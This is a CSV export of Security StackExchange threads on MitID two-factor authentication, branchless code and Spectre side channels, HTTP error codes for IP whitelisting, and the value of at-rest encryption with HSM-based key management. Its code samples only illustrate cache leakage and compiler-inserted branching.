"258853","258853","Does the new Danish authentication solution for online contact with municipality etc. genuinely use 2FA?","<p>In Denmark, the current digital identification/authentication solution for pretty much any online contact with the municipality, state, etc. is being switched over to  a setup consisting of the following steps:</p>
<ol>
<li>You enter your username on the site where you want to log in.</li>
<li>You open the authenticator app (one specific, purpose-made app) on your phone with a six-digit code or touch/face ID.</li>
<li>You approve the login in the app.</li>
</ol>
<p>The username is treated essentially like a password in terms of &quot;should not be known by anyone&quot; (<a href=""https://security.stackexchange.com/a/2386/269235"">as expected</a>, there have been problems with the site helpfully informing you that your username already was taken), but not starred out on any of the sites it's used. The developers maintain that the remaining combination of an authenticator app and a six-digit code to unlock it constitutes two-factor authentication. <br />
Does this actually hold up? If not, does the username/password/userword/passname constitute another factor?
(The best English-language description of the setup I can find is <a href=""https://www.mitid.dk/en-gb/security/"" rel=""nofollow noreferrer"">here</a>.)</p>
<p>EDIT:
I've now found a more detailed description in Danish and had time to translate it. To respond to comments etc.:</p>
<ul>
<li>The app can only be used when activated, and an activated app is personal. Activation is done either with the old authentication setup right now if you already have that or at a municipal service desk if you're registering from scratch. Registration involves an activation code shown on the screen and an 8-digit temporary PIN sent by SMS to a mobile number that either is already validated or is validated during registration by sending an SMS with another 6-digit validation code to that number</li>
<li>the passcode <em>is</em> centrally validated (by &quot;[zero knowledge password proof] technology combined with other technologies&quot;, however informative that may be about their implementation) though as I mentioned one can use biometrics to give it instead and they in fact suggest to do so for ease of use</li>
<li>you do get locked out after a certain number of unsuccessful tries</li>
<li>you can have up to three copies of the app attached to you, so if you have one on your tablet and one on your phone and lose either device you can use the remaining one to activate the app on your new phone/tablet; otherwise you have to do the registration process over again</li>
</ul>
","10","7","258874","<p>The 6 digit code is only <em>something you know</em> and the app is not unique so cannot be a <em>something you have</em>. Furthermore a 6 digit code + a password would only be 2 <em>something you know</em>.</p>
<p>But if the app also has a unique token stored in your phone and hard to extract, it becomes a <em>something you have</em>: nobody with the same app and the 6 digit code <strong>but anotheur phone</strong> could impersonate you.</p>
<p>A good example for that in a smartcard X509 certificate authentication: the user only types the PIN code for the certificate. Yet the authentication level is the currently highest common level because extracting a certificate from a <em>decent</em> smartcard is not possible without expensive tools, and even with that it should take more than one day, so the user should notice that their card was stolen and have the certificate to be invalidated.</p>
<p>I am not aware of such a secure storage on smartphones, but simply extracting a private app value is not easy on a not rooted (or jailbreaked) phone. So IMHO generating a random token on the app, using it as a private asymetric key and only giving the public key to the authentication server could make that app act as a valid 2FA authentication system. Simply the <em>what you have</em> is not the app but is the phone content.</p>
","3"
"258853","258853","Does the new Danish authentication solution for online contact with municipality etc. genuinely use 2FA?","<p>In Denmark, the current digital identification/authentication solution for pretty much any online contact with the municipality, state, etc. is being switched over to  a setup consisting of the following steps:</p>
<ol>
<li>You enter your username on the site where you want to log in.</li>
<li>You open the authenticator app (one specific, purpose-made app) on your phone with a six-digit code or touch/face ID.</li>
<li>You approve the login in the app.</li>
</ol>
<p>The username is treated essentially like a password in terms of &quot;should not be known by anyone&quot; (<a href=""https://security.stackexchange.com/a/2386/269235"">as expected</a>, there have been problems with the site helpfully informing you that your username already was taken), but not starred out on any of the sites it's used. The developers maintain that the remaining combination of an authenticator app and a six-digit code to unlock it constitutes two-factor authentication. <br />
Does this actually hold up? If not, does the username/password/userword/passname constitute another factor?
(The best English-language description of the setup I can find is <a href=""https://www.mitid.dk/en-gb/security/"" rel=""nofollow noreferrer"">here</a>.)</p>
<p>EDIT:
I've now found a more detailed description in Danish and had time to translate it. To respond to comments etc.:</p>
<ul>
<li>The app can only be used when activated, and an activated app is personal. Activation is done either with the old authentication setup right now if you already have that or at a municipal service desk if you're registering from scratch. Registration involves an activation code shown on the screen and an 8-digit temporary PIN sent by SMS to a mobile number that either is already validated or is validated during registration by sending an SMS with another 6-digit validation code to that number</li>
<li>the passcode <em>is</em> centrally validated (by &quot;[zero knowledge password proof] technology combined with other technologies&quot;, however informative that may be about their implementation) though as I mentioned one can use biometrics to give it instead and they in fact suggest to do so for ease of use</li>
<li>you do get locked out after a certain number of unsuccessful tries</li>
<li>you can have up to three copies of the app attached to you, so if you have one on your tablet and one on your phone and lose either device you can use the remaining one to activate the app on your new phone/tablet; otherwise you have to do the registration process over again</li>
</ul>
","10","7","258878","<p>Yes, if the 2FA app contains and uses a secret that's <em>unique to you</em>.  If it's got an embedded client key that's different for each install, then it becomes something that you, and only you, have (ignoring the risk of exfiltration).</p>
<p>If <em>multiple users</em> have identical 2FA app it can no longer be something that authenticates you, and only the passcode you provide will contribute.</p>
","0"
"258853","258853","Does the new Danish authentication solution for online contact with municipality etc. genuinely use 2FA?","<p>In Denmark, the current digital identification/authentication solution for pretty much any online contact with the municipality, state, etc. is being switched over to  a setup consisting of the following steps:</p>
<ol>
<li>You enter your username on the site where you want to log in.</li>
<li>You open the authenticator app (one specific, purpose-made app) on your phone with a six-digit code or touch/face ID.</li>
<li>You approve the login in the app.</li>
</ol>
<p>The username is treated essentially like a password in terms of &quot;should not be known by anyone&quot; (<a href=""https://security.stackexchange.com/a/2386/269235"">as expected</a>, there have been problems with the site helpfully informing you that your username already was taken), but not starred out on any of the sites it's used. The developers maintain that the remaining combination of an authenticator app and a six-digit code to unlock it constitutes two-factor authentication. <br />
Does this actually hold up? If not, does the username/password/userword/passname constitute another factor?
(The best English-language description of the setup I can find is <a href=""https://www.mitid.dk/en-gb/security/"" rel=""nofollow noreferrer"">here</a>.)</p>
<p>EDIT:
I've now found a more detailed description in Danish and had time to translate it. To respond to comments etc.:</p>
<ul>
<li>The app can only be used when activated, and an activated app is personal. Activation is done either with the old authentication setup right now if you already have that or at a municipal service desk if you're registering from scratch. Registration involves an activation code shown on the screen and an 8-digit temporary PIN sent by SMS to a mobile number that either is already validated or is validated during registration by sending an SMS with another 6-digit validation code to that number</li>
<li>the passcode <em>is</em> centrally validated (by &quot;[zero knowledge password proof] technology combined with other technologies&quot;, however informative that may be about their implementation) though as I mentioned one can use biometrics to give it instead and they in fact suggest to do so for ease of use</li>
<li>you do get locked out after a certain number of unsuccessful tries</li>
<li>you can have up to three copies of the app attached to you, so if you have one on your tablet and one on your phone and lose either device you can use the remaining one to activate the app on your new phone/tablet; otherwise you have to do the registration process over again</li>
</ul>
","10","7","258886","<p>If you go too far deep, everything becomes something you have. If attacker has access to your computer and has installed lets say a key logger, then they can extract your password and extract TOTP key from your app.</p>
<p>So if your level of security allows for a software app for one time passwords, then a use of a competent password manager shouldn't be worse than entering your password on the web site and using special app for one time passwords.</p>
<p>If you require users to login from a separate device than they use for one-time password generation, then that's higher security. But if one uses 2+ banks and multiple other important accounts like to government/tax services, etc. it becomes unreasonable to believe that users will not turn their passwords into another thing they have (instead of something they know).</p>
<p>At the end you better have a good remedy plan in case of successful attacks.</p>
","0"
"258805","258805","Does having no 'if' blocks in code mitigate side-channel attacks?","<p>Looking through descriptions of Spectre and Meltdown it seems that speculative execution - the basis for these attacks - occurs only with branched code. Therefore, it seems logical to conclude that having no if statements would preclude speculative execution and consequently, the side-channel attacks. Is this a correct statement?</p>
","8","6","258807","<p>There is no IF statement at the CPU level and it is unclear which programming language with if statements you refer to. But depending on the programming language various statements will result in conditional branches (and thus speculative execution), i.e. various loops with conditions like ranges, ternary operator ...</p>
","5"
"258805","258805","Does having no 'if' blocks in code mitigate side-channel attacks?","<p>Looking through descriptions of Spectre and Meltdown it seems that speculative execution - the basis for these attacks - occurs only with branched code. Therefore, it seems logical to conclude that having no if statements would preclude speculative execution and consequently, the side-channel attacks. Is this a correct statement?</p>
","8","6","258812","<p>Removing branching would probably mitigate these problems. But so what? If you remove branching you essentially remove the need for a general purpose computer, and you're left with something that can do more or less static set of operations on some data.</p>
<p>Such computers are very common in the form of <a href=""https://en.wikipedia.org/wiki/Digital_signal_processor"" rel=""nofollow noreferrer"">DSP</a>'s, but they're not general purpose computers.</p>
<p>Removing branching on a x86 cpu (which is the family hit by meltdown and spectre) is throwing the baby out with the bathwater.</p>
","11"
"258805","258805","Does having no 'if' blocks in code mitigate side-channel attacks?","<p>Looking through descriptions of Spectre and Meltdown it seems that speculative execution - the basis for these attacks - occurs only with branched code. Therefore, it seems logical to conclude that having no if statements would preclude speculative execution and consequently, the side-channel attacks. Is this a correct statement?</p>
","8","6","258819","<p>Not just if.</p>
<p>You will have to remove all functions, methods, lambdas, classes, loops, whiles, exceptions, polling, switch, if, lookup tables, jump tables.</p>
<p>You will then have no need for tests, counters, maths, polls, conditionals,  environment queries, any other form of input, including keyboards, mice, ram, rom, or other forms of storage. (You can have input streams)</p>
<p>Basically, remove branching and you remove computers.</p>
<p>Despite what is said above, even DSP (those that do FFT and stuff like that) have branches in them.
I guess you might be able to construct an ADC or a DAC - but only a very primitive one.</p>
<p>Try having a light circuit at home that doesn’t have switches!</p>
<p>On intel about 15% of all instructions (by popularity, not by count) involve branches of some sort; and intel has a disproportionately high demand for moves. On most other CPUs there are a correspondingly greater proportion of branches.</p>
","19"
"258805","258805","Does having no 'if' blocks in code mitigate side-channel attacks?","<p>Looking through descriptions of Spectre and Meltdown it seems that speculative execution - the basis for these attacks - occurs only with branched code. Therefore, it seems logical to conclude that having no if statements would preclude speculative execution and consequently, the side-channel attacks. Is this a correct statement?</p>
","8","6","258835","<p>If you access any memory address that is not already known by the attacker, information can be leaked through the cache.</p>
<p>Consider the following function:</p>
<pre><code>char get_secret_message_byte(int index) {
    return secret_code_table[encoded_secret_message[index]];
}
</code></pre>
<p>If the cache is not populated before this function is called, then part of <code>secret_code_table</code> will be loaded into the cache, leaking information about the value of <code>encoded_secret_message[index]</code>, which is useful to an attacker.</p>
<p>Also, part of <code>encoded_secret_message</code> will be loaded into the cache, leaking information about the value of <code>index</code>. If the attacker already knows <code>index</code>, it's not useful to them.</p>
","3"
"258805","258805","Does having no 'if' blocks in code mitigate side-channel attacks?","<p>Looking through descriptions of Spectre and Meltdown it seems that speculative execution - the basis for these attacks - occurs only with branched code. Therefore, it seems logical to conclude that having no if statements would preclude speculative execution and consequently, the side-channel attacks. Is this a correct statement?</p>
","8","6","258848","<p>Unfortunately, even aside from the other issues mentioned, compilers can produce conditional execution even in cases where you did not explicitly write a conditional. This most commonly arises from compiler optimizations, but can also result from e.g. ABI calls to emulate missing features.</p>
<p>For instance:</p>
<pre><code>#include &lt;stdint.h&gt;

uint64_t foo(uint64_t x, uint64_t y) {
    return x % y;
}
</code></pre>
<p>On Clang 11.0.1 on ARMv7a, <a href=""https://godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(filename:%271%27,fontScale:14,fontUsePx:%270%27,j:2,lang:___c,selection:(endColumn:2,endLineNumber:5,positionColumn:2,positionLineNumber:5,selectionStartColumn:1,selectionStartLineNumber:1,startColumn:1,startLineNumber:1),source:%27%23include+%3Cstdint.h%3E%0A%0Auint64_t+foo(uint64_t+x,+uint64_t+y)+%7B%0A++++return+x+%25+y%3B%0A%7D%27),l:%275%27,n:%270%27,o:%27C+source+%232%27,t:%270%27)),header:(),k:50,l:%274%27,m:50,n:%270%27,o:%27%27,s:0,t:%270%27),(g:!((h:compiler,i:(compiler:armv7-cclang1101,filters:(b:%270%27,binary:%271%27,commentOnly:%270%27,demangle:%270%27,directives:%270%27,execute:%271%27,intel:%270%27,libraryCode:%270%27,trim:%270%27),flagsViewOpen:%271%27,fontScale:14,fontUsePx:%270%27,j:1,lang:___c,libs:!(),options:%27-O3+--std%3Dgnu11%27,selection:(endColumn:1,endLineNumber:1,positionColumn:1,positionLineNumber:1,selectionStartColumn:1,selectionStartLineNumber:1,startColumn:1,startLineNumber:1),source:2,tree:%271%27),l:%275%27,n:%270%27,o:%27armv7-a+clang+11.0.1+(C,+Editor+%232,+Compiler+%231)%27,t:%270%27)),header:(),k:50,l:%274%27,n:%270%27,o:%27%27,s:0,t:%270%27)),l:%272%27,m:100,n:%270%27,o:%27%27,t:%270%27)),version:4"" rel=""noreferrer"">this compiles to</a></p>
<pre><code>foo:
  push {r11, lr}
  bl __aeabi_uldivmod
  mov r0, r2
  mov r1, r3
  pop {r11, lr}
  bx lr
</code></pre>
<p>This generally results in conditional execution within <code>__aeabi_uldivmod</code>. For instance, in the Clang toolchain, you have</p>
<p><a href=""https://code.woboq.org/llvm/compiler-rt/lib/builtins/arm/aeabi_uldivmod.S.html"" rel=""noreferrer""><code>__aeabi_uldivmod</code></a>:</p>
<pre><code>DEFINE_COMPILERRT_FUNCTION(__aeabi_uldivmod)
[...]
bl SYMBOL_NAME(__udivmoddi4)
</code></pre>
<p>which then calls into <a href=""https://code.woboq.org/llvm/compiler-rt/lib/builtins/udivmoddi4.c.html#__udivmoddi4"" rel=""noreferrer""><code>__udivmoddi4</code></a>:</p>
<pre><code>COMPILER_RT_ABI du_int __udivmoddi4(du_int a, du_int b, du_int *rem) {
  [...]
  if (n.s.high == 0) {
</code></pre>
<p>...and now you suddenly have conditional execution.</p>
<p>Ditto, under the as-if rule a C compiler can translate e.g.</p>
<pre><code>uint64_t foo(bool b, uint64_t x, uint64_t y) {
    return b*(x%y); /* in C a bool cast to int is 0 or 1 */
}
</code></pre>
<p>into</p>
<pre><code>uint64_t foo(bool b, uint64_t x, uint64_t y) {
    if (b) {
        return x % y;
    }
    return 0;
}
</code></pre>
<p>...which may be advantageous if branching is cheap compared to remainder (which is often the case). And now suddenly you have conditional execution.</p>
<p>Etc, etc.</p>
<p>(You're not immune to this even if you drop down to assembly, by the way. For instance, unaligned access on AArch32, which isn't natively supported on all platforms, is occasionally handled by an abort handler that emulates the instruction. This, of course, involves conditional execution to parse the instruction / emulate it / etc.)</p>
","9"
"258805","258805","Does having no 'if' blocks in code mitigate side-channel attacks?","<p>Looking through descriptions of Spectre and Meltdown it seems that speculative execution - the basis for these attacks - occurs only with branched code. Therefore, it seems logical to conclude that having no if statements would preclude speculative execution and consequently, the side-channel attacks. Is this a correct statement?</p>
","8","6","258876","<p>The trick is to remove branches from those parts of the code where the pattern of branches taken gives the attacker <em>useful</em> information.</p>
<p>Usually, these are areas where &quot;carefully crafted&quot; input can leak single bits of secret data, and where repeated calls can then reveal additional information.</p>
<p>In practice, that is often avoided by chaining constant-time cryptographic operations so that the first branch afterwards is a general &quot;passed checks&quot; test -- so for example you'd send an encrypted and signed packet, and implement both decryption and verification to be branch-free, then an attacker would, without knowledge of the signing key, only be able to generate packets that are rejected at the exact same point.</p>
<p>Actually parsing the received packets would not necessarily have to be branch-free if the attacker doesn't gain anything there anymore -- most likely they are more interested in extracting secret key material (because that allows exploitation in the future), not reading single messages (which may have immediately observable effects anyway).</p>
","2"
"258785","258785","Obfuscating HTTP Error Codes","<p>I'm working on a REST API endpoint where we only accept requests from certain domain names. Whitelisting. A dev I'm working with recommended that we return HTTP 400 instead of HTTP 403 if the incoming IP address is not whitelisted. They said it was because we don't want to disclose any unnecessary information.</p>
<p>Is this a common security practice? If so, what is the point of the other HTTP error codes (4xx)? Is there ever a scenario where it's safe to return specific error codes?</p>
","16","5","258787","<p>There is a trade-off between two requirements: what to reveal to help the user and as aid in debugging and what to hide from the user as another layer in defense.</p>
<p>Returning 400 &quot;bad request&quot; instead of a more specific error code is definitely misleading since this error code is related to malformed requests. It will confuse attackers but it will also confuse intended users of your system, thus possibly decrease customer satisfaction and increase your support costs. The problems of too generic error messages can be seen with TLS, where one often only gets a generic &quot;handshake failure&quot; which makes it very hard to figure out what the underlying problem is.</p>
<p>Returning 403 &quot;forbidden&quot; with a very specific reason like &quot;not on source IP whitelist&quot; might reveal too much information about this layer of protection though. A generic 403 instead just means that there is access control and does not reveal anything about its details. This might be a good trade-off between not revealing too much internals and allowing focused debugging of problems.</p>
<p>Apart from that there are specific error codes which trigger actions in clients: 401 and 407 will (in interactive use) lead to prompting for authentication credentials, so they should not be simply replaced with a plain 400 when authentication is requested.</p>
","49"
"258785","258785","Obfuscating HTTP Error Codes","<p>I'm working on a REST API endpoint where we only accept requests from certain domain names. Whitelisting. A dev I'm working with recommended that we return HTTP 400 instead of HTTP 403 if the incoming IP address is not whitelisted. They said it was because we don't want to disclose any unnecessary information.</p>
<p>Is this a common security practice? If so, what is the point of the other HTTP error codes (4xx)? Is there ever a scenario where it's safe to return specific error codes?</p>
","16","5","258789","<p>It can make sense to return a misleading error code, provided the error code is consistent with the request. 400 is not a generic error code but is only intended for malformed requests. IMHO returning it for a perfectly correct request is a bad idea.</p>
<p>403 only means that the request is not allowed, but does not disclose the exact reason so I do not think it can be a problem to consistently return it for request coming from unauthorized domains. Alternatively, 404 (nonexistent URL) can also be used as a generic error.</p>
<p>Honestly, I would stick to 403. Imagine that a valid user takes it machine elsewhere and tries to connect from there with an IP coming from an unauthorized domain. Security reasons require that you reject the request. Telling them that the request is unauthorized does make sense, and they could guess the reason. But giving a different error could have them spending time in trying to fix a network (local proxy) problem and in the end lead to a bad user experience for little if any added security.</p>
<p>If it is a common use in your organization, I cannot imagine a strong reason not to follow it anyway, but if it is just a <em>why not idea</em> from a co-worker, IMHO you can safely forget about it...</p>
","18"
"258785","258785","Obfuscating HTTP Error Codes","<p>I'm working on a REST API endpoint where we only accept requests from certain domain names. Whitelisting. A dev I'm working with recommended that we return HTTP 400 instead of HTTP 403 if the incoming IP address is not whitelisted. They said it was because we don't want to disclose any unnecessary information.</p>
<p>Is this a common security practice? If so, what is the point of the other HTTP error codes (4xx)? Is there ever a scenario where it's safe to return specific error codes?</p>
","16","5","258841","<p>I agree with the other contributors. As said by @MechMK1 telling a potential attacker that their IP address is not whitelisted does not provide them any real advantage.</p>
<p>What your dev is proposing will only make <strong>testing</strong> and <strong>debugging</strong> more difficult for the developers, because they will always have to keep in mind that they can't trust the error codes they are receiving. Not to mention <strong>unit testing</strong>.</p>
<p><strong>And since this is a REST API using proper HTTP status codes is even more crucial because they are examined to determine the outcome of the requests.</strong></p>
<p>But this one has me confused:</p>
<blockquote>
<p>we only accept requests from certain domain names</p>
</blockquote>
<p>Do you mean IP addresses or you are performing reverse DNS against the remote host ? Be careful, PTR records can be spoofed.</p>
<p>If there is a dedicated domain name or IP address for the API you could as well perform whitelisting at the <strong>firewall</strong> level, so that unauthorized IP addresses will not even have an opportunity to interact with the website hosting the API.</p>
<p>Note that before a potential attacker even gets a 403 response they should figure out how to send valid requests to your API (unless your API is publicly documented). Until then, they should actually get 400 errors, precisely because their queries are malformed and not in the expected format.</p>
","5"
"258785","258785","Obfuscating HTTP Error Codes","<p>I'm working on a REST API endpoint where we only accept requests from certain domain names. Whitelisting. A dev I'm working with recommended that we return HTTP 400 instead of HTTP 403 if the incoming IP address is not whitelisted. They said it was because we don't want to disclose any unnecessary information.</p>
<p>Is this a common security practice? If so, what is the point of the other HTTP error codes (4xx)? Is there ever a scenario where it's safe to return specific error codes?</p>
","16","5","258845","<p>This will look quite similar to the other requests in that I agree as well that it's better to show a clear message.</p>
<p>Note that you should apply the IP whitelist as the first check. I.e. you don't parse the json parameters, and error a 400 if they are wrong, then issue a 403. Or, a more extreme case, check if the password is wrong and only if it is right then verify the source IP. No, it's better to check the IP first, and fail early if the IP address is not authorized, without parsing any of their data.†</p>
<p>At this point, the only information provided by a detailed error is that you are checking the source IP. Something which is hard to guess anyway [if not directly (almost) spelled out in the documentation for end users], and that they cannot &quot;bypass&quot; anyway (hopefully).‡</p>
<p>I would go even further and suggest not only to say &quot;Your IP address is not whitelisted&quot;, but also the detected IP address such as &quot;198.51.100.85 is not allowed here&quot;.</p>
<p><a href=""https://security.stackexchange.com/users/125626/anonymous"">Anonymous</a> mentions that it will make testing and debugging more difficult for the developers, but I add that it's not only testing that will be hampered but production as well.</p>
<p>If it's only used internally, the more verbose error may help the sysadmins or developers deploying the systems connecting to the API when setting it up (or when suddenly discovering that it no longer works after some non-announced routing changes).</p>
<p>If it's also used by end users, it will be even more useful, for both end users (&quot;D'oh!, I needed to be connected from X&quot;) and your own support having to help users when &quot;It doesn't work&quot;. If you are lucky, when asking &quot;Are you accessing from a whitelisted IP?&quot; you could receive a clear &quot;No, we changed it 2 months ago, our connecting IP address is X now&quot;. Other people wouldn't even know what their public IP address is, claim that they are connecting (to your system in the internet) from IP 192.168.1.3 ...</p>
<p>‎</p>
<p>† It's common to whitelist at the firewall level as well, in which case it wouldn't even reach the application layer.</p>
<p>‡ In order to bypass an IP filter options would basically be to perform BGP hijacking, control an intermediate router between the server and a whitelisted client or get a client to open a malicious web page to send the evil request on your behalf (assuming the API will not reject what comes that way). If the API needs to cater to proxys forwarding the original IP address (such as X-Forwarded-For header), there may be vulnerabilities on its handling that could allow additional bypasses.</p>
","1"
"258785","258785","Obfuscating HTTP Error Codes","<p>I'm working on a REST API endpoint where we only accept requests from certain domain names. Whitelisting. A dev I'm working with recommended that we return HTTP 400 instead of HTTP 403 if the incoming IP address is not whitelisted. They said it was because we don't want to disclose any unnecessary information.</p>
<p>Is this a common security practice? If so, what is the point of the other HTTP error codes (4xx)? Is there ever a scenario where it's safe to return specific error codes?</p>
","16","5","258881","<p>What your colleague is suggesting is <strong>Security by Obscurity</strong>.</p>
<p>It arguably has zero real security benefits. The thinking goes like this: if an attacker is not very good, then obscurity by security may work, but in this case any other kind of security (i.e., the &quot;good&quot; kind of security) will work as well. If, on the other hand, the attacker is very good (or has more knowledge, for example the source code of the application under attack, which is generally not considered part of security these days), then obscurity will simply not help.</p>
<p>(There is a valid reason for obscurity, and that is if you're living  in an oppressive regime, using something like Tor or other schemes to communicate without that being visible. But even then - this kind of obscurity is not there to keep the content of your transactions secret, TLS would be enough for that. It is there to hide that you are communicating at all. Not the use-case you're currently asking about.)</p>
<p>So you <em>need</em> the &quot;good&quot; variant of security in any case. In your case this means that your whitelist processing must be tight - for example, the way your whitelist is stored must be such that an attacker cannot easily add their identity to it; it must also be hard to spoof the identity, and so on. The simple fact that there is a whitelist is part of the algorithm, and thus should not be relied upon for security. You might think about ditching the whitelist approach at all, and switch over to client certificates. But all of that is not here nor there...</p>
<p>To answer your question: the HTTP codes should be used as intended, and the code in itself provides no particular benefit to an attacker. If it really would make a difference, you have a whole other problem to solve. At the same time, the additional info you can give along in a plaintext response message should not reveal any details helpful to an attacker. If you want  to make it easy for you, just return the <a href=""https://datatracker.ietf.org/doc/html/rfc7231#section-6"" rel=""nofollow noreferrer"">standard meaning of the HTTP code</a> as message body, most libraries should do that automatically if you leave the response message empty.</p>
<p>Do <em>not</em> add any kind of debug info, JSON output, stack traces etc. into the message body of your 4xx or 5xx responses. Those go into your server-side logfile.</p>
<p>If a 4xx is for human consumption, keep in mind that only throwing a bare 4xx response is very user unfriendly - make it a proper &quot;normal&quot; HTML page within your UI design (i.e. with the regular menu bars, side panels, a link to your help desk or documentation or whatever it is you use) that's as beautiful as you want for your customers. But still do not give any particular information that tells a possible attacker anything they can use to refine their attacks.</p>
","2"
"258780","258780","Is at-rest encryption worth it if the key has to be kept accessible for decryption?","<p>From the way I understand it, at-rest encryption is used to protect data when it's being stored at a datacenter so that if someone manages to get data they shouldn't have, they don't have anything useful. But regardless of what type of encryption is being used, the key (or some other method) also has to be stored somewhere - readily accessible for decryption. So, wouldn't it be simple for someone to just undo the encryption? Given they already gained access.</p>
<p>Am I just not getting how it works or is there some other concept I'm not taking into consideration?</p>
","29","8","258781","<p>Yes, it's worth it, by far.</p>
<p>Computers get stolen. If the hard disk is encrypted, the thief ends up only with hardware, and hardware is cheap to replace. If the disks aren't encrypted, the thief has the hardware and the data. Depending on what kind of data, the company can lose intellectual property, industry secrets, HR data, and that can translate into huge fines (or dead people, if the data is the real names of <a href=""https://foreignpolicy.com/2018/08/15/botched-cia-communications-system-helped-blow-cover-chinese-agents-intelligence/"" rel=""noreferrer"">CIA operatives</a>).</p>
<p>USB devices are easy to forget, or to misplace. If they are encrypted, and the key is stored on the computer, there's nothing on the drive that can be read.</p>
<p>Full disk encryption indeed keeps the key on the system, but the key is password protected, and the password is not on the system. Bruteforcing the password is possible, but depending on the length of it, can take way more time than the data is interesting (think taking 1000 years to crack it).</p>
<p>High security systems keep the keys on a TPM or a smartcard. The first has pretty secure settings, and capturing data from inside a TPM is not remotely easy to achieve. And a smartcard usually is not stored with the computer, and usually is protected by a PIN and auto erases itself in case of a bruteforce attempt.</p>
<p>There are LUKS settings (for Linux computers) that don't even keep the encrypted header on the disk, but it resides on a USB drive. In the case of theft, there is nothing to be bruteforced, because the header is on another hardware, probably with the user.</p>
","31"
"258780","258780","Is at-rest encryption worth it if the key has to be kept accessible for decryption?","<p>From the way I understand it, at-rest encryption is used to protect data when it's being stored at a datacenter so that if someone manages to get data they shouldn't have, they don't have anything useful. But regardless of what type of encryption is being used, the key (or some other method) also has to be stored somewhere - readily accessible for decryption. So, wouldn't it be simple for someone to just undo the encryption? Given they already gained access.</p>
<p>Am I just not getting how it works or is there some other concept I'm not taking into consideration?</p>
","29","8","258782","<p>In addition to what @hft and @ThoriumBR mentioned, specially in context of a datacenter, encryption makes it easier to discard the drives when they fail and need to be replaced.</p>
<p>If full disk encryption is not used, discarding drive would require either securely wiping the entire drive (which would be impractical for a failed drive anyways) or effectively destroying the drive so that no data remains recoverable, which requires specialized equipment and trained people to do it. While this may not be a massive issue (as pointed out by others below), there would still be a risk that the drives get lost/stolen before they are destroyed, or that they are not shredded properly and some data may remain recoverable afterwards.</p>
<p>If encryption is used, it is much more simple. You just have to make sure the key has been securely deleted and then the drive can be thrown away. Since the key is usually stored in a separate hardware security module (and in some cases, protected with a password), deleting it is trivial.</p>
","24"
"258780","258780","Is at-rest encryption worth it if the key has to be kept accessible for decryption?","<p>From the way I understand it, at-rest encryption is used to protect data when it's being stored at a datacenter so that if someone manages to get data they shouldn't have, they don't have anything useful. But regardless of what type of encryption is being used, the key (or some other method) also has to be stored somewhere - readily accessible for decryption. So, wouldn't it be simple for someone to just undo the encryption? Given they already gained access.</p>
<p>Am I just not getting how it works or is there some other concept I'm not taking into consideration?</p>
","29","8","258799","<p>Long story short, against a decided attacker with proper means, it'll be useless. The question would be about your threat model.</p>
<p>The decryption key (or its encryption key) will typically be stored on a different machine, in a different location. The machine storing this key will often only have that role, and will be more guarded.
That means if somebody steals a bunch of machine from one place, including yours, your data is safe. They would need to steal a machine from another location, likely well guarded. That makes it worth it against theft. And of course from a liability point of view as outlined in other answers.</p>
","8"
"258780","258780","Is at-rest encryption worth it if the key has to be kept accessible for decryption?","<p>From the way I understand it, at-rest encryption is used to protect data when it's being stored at a datacenter so that if someone manages to get data they shouldn't have, they don't have anything useful. But regardless of what type of encryption is being used, the key (or some other method) also has to be stored somewhere - readily accessible for decryption. So, wouldn't it be simple for someone to just undo the encryption? Given they already gained access.</p>
<p>Am I just not getting how it works or is there some other concept I'm not taking into consideration?</p>
","29","8","258802","<blockquote>
<p>But regardless of what type of encryption is being used, the key (or
some other method) also has to be stored somewhere - readily
accessible for decryption. So, wouldn't it be <strong>simple</strong> for someone to
just undo the encryption? Given they already gained access.</p>
</blockquote>
<p>A secure implementation will try to keep that problem from being simple to solve.</p>
<p>Let's look at VMWare's vCenter as one example.  Say your cloud provider uses vCenter to manage all their virtual machines.  When you click on the button that says &quot;I need a Fedora version 35 server with 40GB disk&quot;, your provider is using vCenter to provision it. vCenter tells a vSphere instance to spin up a virtual server for you. When it creates your virtual disk image it will encrypt that image with a unique key.  That key does not come from vCenter; vCenter requests that encryption key from a key server.</p>
<p>The key server is a completely different product running on specially protected hardware, and it keeps the database of encryption keys.  That database is also encrypted, of course.  The Key Encrypting Key (KEK) is the master key to the database, and it is stored in yet another system called a Hardware Security Module (HSM).  The HSM encrypts the KEK, and is designed so the KEK never leaves the HSM.  Instead, the key server sends the encrypted database record with your key to the HSM and asks for it to be decrypted; the decrypted key is then returned to vCenter, which passes it to the vSphere instance hosting the VM, decrypting its disk image.</p>
<p>The HSM is designed to be extremely sensitive to detecting tampering, and if it is disturbed it will instantly erase the special memory where the keys protecting the KEK are stored.  Both the key server hardware and the HSM hardware are protected by physical armor and locks, which also contain tamper detection systems that will zeroize sensitive memory. The key servers and HSMs are also not normally managed by data center personnel.  They may be locked in a special cage in the data center.  To set them up and get them operational they require various security officers to show up with the needed keys and passcodes to unlock and initialize them.</p>
<p>All the intermediate machines that handle the key do so in memory, so the key stays off of disks and out of swap space.  The disk image key itself is never exposed internally to the VM.</p>
<p>Now, let's look at possible attacks:</p>
<ul>
<li>A running VM is as vulnerable as any other machine, so it needs to be defended or the attacker can extract the data from it directly.</li>
<li>To steal the VM's entire disk image, the attacker needs to attack the vSphere instance hosting the virtual machine while it has the key in memory, or the image will remain encrypted.</li>
<li>To steal all disk images, the attacker would have to attack vCenter to steal the authorization used to request the disk keys from the key servers.</li>
<li>To steal all keys, the attacker would have to attack the key server.</li>
<li>And to steal the KEK, the attacker would have to defeat the HSM's protections.</li>
</ul>
<p>Some of those tasks are easier than others; but few are what you might consider &quot;simple&quot;.</p>
","6"
"258780","258780","Is at-rest encryption worth it if the key has to be kept accessible for decryption?","<p>From the way I understand it, at-rest encryption is used to protect data when it's being stored at a datacenter so that if someone manages to get data they shouldn't have, they don't have anything useful. But regardless of what type of encryption is being used, the key (or some other method) also has to be stored somewhere - readily accessible for decryption. So, wouldn't it be simple for someone to just undo the encryption? Given they already gained access.</p>
<p>Am I just not getting how it works or is there some other concept I'm not taking into consideration?</p>
","29","8","258804","<p>The major downside to at-rest encryption where the key is also stored is <strong>user confusion and moral hazards.</strong></p>
<p>Imagine I have a laptop full of private patient data. I use full disk encryption - but the password is written on a post-it note stuck to the laptop. <em>Technically</em> the data is encrypted - but for most practical purposes, it is <em>as if</em> the data is unencrypted.</p>
<p>If my laptop gets stolen, and my employer needs to announce the breach, will they want to make it clear the data was effectively unencrypted? Or will they decide it's better for the company if they describe the data as fully encrypted?</p>
","2"
